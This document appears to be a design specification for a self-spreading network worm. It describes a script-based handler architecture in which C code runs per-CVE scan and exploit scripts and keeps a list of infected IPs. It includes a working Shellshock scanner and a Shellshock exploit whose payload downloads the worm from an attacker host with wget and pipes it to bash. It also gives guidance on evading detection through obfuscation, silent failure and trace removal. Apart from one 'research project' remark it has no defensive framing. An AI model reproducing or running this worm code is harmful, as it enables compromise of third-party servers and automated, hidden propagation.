# Handlers & Implementation Details

## Handler Architecture: Script-Based

### Design Decision

**Exploit handlers are shell scripts in folders** - Simple, modular, scalable.

**Engine Responsibility**: Call handlers, collect results (doesn't care HOW)
**Handler Responsibility**: Implement scanning/exploitation, make scripts undetectable

---

## Folder Structure

```
worm/
  ├── worm (main binary)
  ├── exploits/
  │   ├── cve-2014-6271.sh      (Shellshock exploit)
  │   ├── cve-2014-0160.sh      (Heartbleed exploit)
  │   ├── cve-local-esc.sh      (Local privilege escalation)
  │   └── ... (more exploit scripts)
  └── scans/
      ├── cve-2014-6271-scan.sh (Shellshock scan)
      ├── cve-2014-0160-scan.sh (Heartbleed scan)
      └── ... (more scan scripts)
```

---

## Handler Registration

### Engine Side

```c
typedef struct {
    int cve_id;
    char* scan_script_path;      // Path to scan script
    char* exploit_script_path;   // Path to exploit script
    int priority_order;           // For decision phase
} cve_handler_config_t;

cve_handler_config_t handlers[] = {
    {
        .cve_id = CVE_2014_6271,
        .scan_script_path = "scans/cve-2014-6271-scan.sh",
        .exploit_script_path = "exploits/cve-2014-6271.sh",
        .priority_order = 1
    },
    // ... more handlers
};

int num_handlers = sizeof(handlers) / sizeof(handlers[0]);
```

---

## Script Interfaces

### Scan Script Interface

**Input**: Target IP as command-line argument
**Output**: Standard format (stdout)

```bash
#!/bin/bash
# scans/cve-2014-6271-scan.sh

TARGET_IP="$1"

# Perform scan (handler's implementation)
# ... scan logic ...

# Output in standard format
echo "CVE_ID:CVE-2014-6271"
echo "VULNERABLE:1"          # 0 or 1
echo "CONFIDENCE:8"          # 0-10
echo "PORT_OPEN:80"          # Port number or 0
echo "SERVICE:HTTP"          # Service type
```

### Exploit Script Interface

**Input**: Target IP as command-line argument
**Output**: Exit code (0 = success, non-zero = failure)

```bash
#!/bin/bash
# exploits/cve-2014-6271.sh

TARGET_IP="$1"

# Perform exploit (handler's implementation)
# ... exploit logic ...

# Return success/failure
if [ $? -eq 0 ]; then
    exit 0  # Success
else
    exit 1  # Failure
fi
```

---

## Engine Calls Handlers

### Scan Phase

```c
cve_scan_result_t scan_with_handler(cve_handler_config_t* handler, const char* target_ip) {
    char command[512];
    snprintf(command, sizeof(command), "%s %s", 
             handler->scan_script_path, target_ip);
    
    // Execute scan script
    FILE* fp = popen(command, "r");
    if (!fp) return (cve_scan_result_t){0};
    
    // Parse script output
    char buffer[256];
    cve_scan_result_t result = {0};
    while (fgets(buffer, sizeof(buffer), fp)) {
        // Parse: "VULNERABLE:1" or "CONFIDENCE:8" etc.
        if (strstr(buffer, "VULNERABLE:")) {
            sscanf(buffer, "VULNERABLE:%d", &result.is_vulnerable);
        } else if (strstr(buffer, "CONFIDENCE:")) {
            sscanf(buffer, "CONFIDENCE:%d", &result.confidence);
        }
        // ... parse other fields
    }
    pclose(fp);
    
    return result;
}
```

### Execute Phase

```c
int execute_exploit(cve_handler_config_t* handler, const char* target_ip) {
    char command[512];
    snprintf(command, sizeof(command), "%s %s", 
             handler->exploit_script_path, target_ip);
    
    // Execute exploit script
    int result = system(command);
    return (result == 0) ? 1 : 0;  // 1 = success, 0 = failure
}
```

---

## Author Responsibility: Making Scripts Undetectable

### Guidelines for CVE Authors

When adding a new CVE, authors are responsible for making scripts undetectable:

#### 1. **Obfuscation**
- Encode/encrypt obvious strings
- Use base64 encoding for payloads
- Avoid recognizable patterns

#### 2. **Minimal Footprint**
- Don't create temporary files
- Use memory-only operations when possible
- Clean up on exit

#### 3. **Clean Exit**
- Remove traces on failure
- Use trap for cleanup
- Fail silently

#### 4. **Stealth Techniques**
- Reuse existing connections
- Minimize network activity
- Use passive observation when possible

#### 5. **Error Handling**
- Fail silently (redirect to /dev/null)
- Don't leave error messages
- Handle errors gracefully

#### 6. **Timing**
- Add random delays
- Avoid rate limiting
- Don't be too aggressive

---

## Example Handler Scripts

### Shellshock Scan Script

```bash
#!/bin/bash
# scans/cve-2014-6271-scan.sh

TARGET_IP="$1"

# Lightweight scan: Single connection, test Shellshock
response=$(curl -s -m 5 -H "User-Agent: () { :; }; echo VULNERABLE" \
           "http://${TARGET_IP}/cgi-bin/status.cgi" 2>/dev/null)

if echo "$response" | grep -q "VULNERABLE"; then
    echo "CVE_ID:CVE-2014-6271"
    echo "VULNERABLE:1"
    echo "CONFIDENCE:8"
    echo "PORT_OPEN:80"
    echo "SERVICE:HTTP"
    exit 0
else
    echo "CVE_ID:CVE-2014-6271"
    echo "VULNERABLE:0"
    echo "CONFIDENCE:3"
    exit 1
fi
```

### Shellshock Exploit Script

```bash
#!/bin/bash
# exploits/cve-2014-6271.sh

TARGET_IP="$1"
WORM_URL="http://attacker/worm"  # Where to fetch worm from

# Exploit via Shellshock
payload="() { :; }; /bin/bash -c 'wget -q -O- ${WORM_URL} | bash'"

# Execute exploit (stealthy implementation)
curl -s -m 10 -H "User-Agent: ${payload}" \
     "http://${TARGET_IP}/cgi-bin/status.cgi" >/dev/null 2>&1

# Check if successful (implementation specific)
# Return success/failure
exit 0
```

---

## State Management Implementation

### In-Memory State

**Purpose**: Track infected IPs to avoid duplicate infections

**Implementation**:
```c
#define MAX_INFECTED 50

char infected_ips[MAX_INFECTED][16];
int infected_count = 0;

int is_infected(const char* ip) {
    for (int i = 0; i < infected_count; i++) {
        if (strcmp(infected_ips[i], ip) == 0) {
            return 1;
        }
    }
    return 0;
}

void mark_infected(const char* ip) {
    if (!is_infected(ip) && infected_count < MAX_INFECTED) {
        strcpy(infected_ips[infected_count], ip);
        infected_count++;
    }
}
```

**Usage**:
```c
void infect_target(const char* ip) {
    // Skip if already infected
    if (is_infected(ip)) {
        printf("[*] %s already infected, skipping\n", ip);
        return;
    }
    
    // Try to infect
    if (try_infection(ip)) {
        mark_infected(ip);
        printf("[+] %s infected successfully\n", ip);
    }
}
```

**Benefits**:
- Simple (~20 lines of code)
- Stealthy (no files on disk)
- Effective (avoids duplicate infections)
- Fast (in-memory access)

**Trade-offs**:
- Lost when process exits (no persistence)
- Doesn't remember failures (just successes)
- Limited to MAX_INFECTED targets

---

## Handler Scanning Methods (Author's Choice)

### Method 1: Local System Scanning

**When**: Worm is already on target system

**Techniques**:
- File system checks (`/usr/bin/*`, `/etc/*`)
- Process inspection (`ps aux`, `/proc/*`)
- Package manager queries (`dpkg -l`, `rpm -qa`)
- System information (`/etc/os-release`, `uname -a`)

**Advantages**: Silent, fast, accurate, no network traffic

### Method 2: Passive Network Observation

**When**: Need remote intelligence

**Techniques**:
- Analyze existing connections
- Parse service banners from established connections
- Extract version info from existing packets

**Advantages**: Minimal additional traffic, uses existing connections

### Method 3: Lightweight Active Probes

**When**: Remote scanning before infection

**Techniques**:
- Single connection, multiple tests
- Reuse connection for multiple requests
- Batch tests together

**Advantages**: Single connection for multiple tests, efficient

### Method 4: Pre-Configured Profiles

**When**: Stealth is critical

**Techniques**:
- Assume CVEs based on context (port + service = likely CVE)
- Use known vulnerable configurations

**Advantages**: No additional traffic
**Disadvantages**: Less accurate

---

## Adding New CVEs

### Step 1: Create Scan Script

```bash
# scans/cve-XXXX-XXXX-scan.sh
#!/bin/bash
TARGET_IP="$1"
# ... scan implementation ...
echo "CVE_ID:CVE-XXXX-XXXX"
echo "VULNERABLE:1"
echo "CONFIDENCE:8"
exit 0
```

### Step 2: Create Exploit Script

```bash
# exploits/cve-XXXX-XXXX.sh
#!/bin/bash
TARGET_IP="$1"
# ... exploit implementation ...
exit 0
```

### Step 3: Register Handler

```c
// Add to handlers array
{
    .cve_id = CVE_XXXX_XXXX,
    .scan_script_path = "scans/cve-XXXX-XXXX-scan.sh",
    .exploit_script_path = "exploits/cve-XXXX-XXXX.sh",
    .priority_order = 5  // Set appropriate priority
}
```

### Step 4: Add Decision Rule

```c
// Add to decision_list
{
    .cve_id = CVE_XXXX_XXXX,
    .priority_order = 5,
    .requires_vulnerable = 1,
    .requires_port_open = 8080,  // Or appropriate port
    .min_confidence = 6,
    .max_risk_level = 6,
    .stealth_required = 0
}
```

---

## Best Practices

### For Authors

1. **Make scripts undetectable** (obfuscation, minimal footprint)
2. **Handle errors gracefully** (fail silently, cleanup)
3. **Use efficient scanning** (single connection, batch tests)
4. **Document your script** (what it does, stealth features)

### For Engine

1. **Call handlers consistently** (same interface for all)
2. **Parse output correctly** (handle all format variations)
3. **Handle script failures** (don't crash on script errors)
4. **Clean up processes** (kill child processes if needed)

---

## Summary

**Handler Architecture**:
- Script-based (exploits in `exploits/` folder)
- Engine calls scripts, doesn't care about implementation
- Authors responsible for stealth/undetectability
- Easy to add new CVEs (just add scripts)

**State Management**:
- In-memory (track infected IPs)
- Simple, stealthy, effective
- No persistence (acceptable for research project)

**Implementation**:
- Simple script interfaces
- Standard output format for scans
- Exit codes for exploits
- Easy to extend and maintain

